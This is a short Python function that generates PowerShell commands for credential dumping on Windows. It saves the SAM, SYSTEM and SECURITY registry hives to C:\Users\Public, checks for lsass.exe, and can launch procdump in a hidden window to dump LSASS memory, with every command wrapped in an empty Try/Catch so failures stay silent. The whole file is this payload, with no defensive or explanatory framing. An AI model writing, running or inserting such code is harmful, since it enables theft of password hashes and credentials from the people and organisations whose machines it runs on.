def get_payload(path="C:\\Users\\Public", use_procdump=False):
    lines = [
        f'Try {{ reg save HKLM\\SAM "{path}\\sam.bak" /y }} Catch {{ }}',
        f'Try {{ reg save HKLM\\SYSTEM "{path}\\system.bak" /y }} Catch {{ }}',
        f'Try {{ reg save HKLM\\SECURITY "{path}\\security.bak" /y }} Catch {{ }}',
        'Try { tasklist /FI "IMAGENAME eq lsass.exe" } Catch { }'
    ]
    if use_procdump:
        lines.append(
            f'Try {{ Start-Process "procdump.exe" -ArgumentList "-ma lsass.exe {path}\\lsass.dmp" -WindowStyle Hidden }} Catch {{ }}'
        )
    return lines

